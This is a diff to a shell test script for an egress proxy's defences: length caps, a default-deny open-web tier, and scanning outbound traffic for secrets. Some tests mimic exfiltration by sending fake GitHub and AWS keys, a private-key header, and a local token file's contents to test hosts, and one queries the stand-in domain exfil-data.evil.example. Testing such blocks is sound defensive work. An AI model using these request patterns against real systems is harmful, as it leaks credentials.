@@ -90,6 +90,22 @@ check dns-aaaa-nodata "$("$venv/bin/python" "$here/harness.py" dns-query 127.0.0
 check dns-aaaa-denied "$("$venv/bin/python" "$here/harness.py" dns-query 127.0.0.1 "$DP" exfil-data.evil.example 28)" "rcode=5 answers=-"
 check clean-registry "$(code "https://registry.npmjs.org:$U/echo")" "200"
 check clean-wildcard "$(code "https://x.wild.test:$U/echo")" "200"
+# request limits: listed hosts get generous caps on the target and query
+check url-cap-listed "$(code "https://api.test:$U/echo/$(head -c 8300 /dev/zero | tr '\0' a)")" "403"
+check query-cap-listed "$(code "https://api.test:$U/echo?q=$(head -c 4200 /dev/zero | tr '\0' a)")" "403"
+check under-caps-ok "$(code "https://api.test:$U/echo?q=$(head -c 3000 /dev/zero | tr '\0' a)")" "200"
+# outbound secret scanning: query, path, header and body; the node's own secret value too
+FAKE_GH="ghp_$(head -c 36 /dev/zero | tr '\0' A)"
+check secret-in-query "$(code "https://api.test:$U/echo?t=$FAKE_GH")" "403"
+check secret-in-path "$(code "https://cdn.test:$U/x/$FAKE_GH")" "403"
+check secret-in-header "$(code -H "X-Note: AKIAABCDEFGHIJKLMNOP" "https://cdn.test:$U/echo")" "403"
+check secret-node-value "$(code "https://cdn.test:$U/echo?v=$(cat "$work/secrets/testsvc.token")")" "403"
+check secret-in-body "$(code -X POST --data-binary $'-----BEGIN OPENSSH PRIVATE KEY-----\nabc' "https://cdn.test:$U/octo/repo.git/git-upload-pack")" "403"
+check clean-body-passes "$(code -X POST --data x "https://cdn.test:$U/octo/repo.git/git-upload-pack")" "501"
+check secret-reason-audited "$(jq -r 'select(.reason=="secret-detected") | .secret_rule' "$work/audit.jsonl" | sort -u | tr '\n' ' ')" "aws-access-key github-token node-secret private-key "
+check secret-not-in-audit "$(grep -c "$FAKE_GH\|AKIAABCDEFGHIJKLMNOP" "$work/audit.jsonl" || true)" "0"
+# open-web tier is off by default: an unlisted host stays denied
+check open-web-off "$(code "https://open.test:$U/echo")" "403"
 # taint narrows egress to allowWhenTainted hosts; the trusted side rewrites the policy
 "$venv/bin/python" "$here/harness.py" policy --dir "$work" --key "$KEY" --tainted
 check tainted-blocks-api "$(code "https://api.test:$U/echo")" "403"
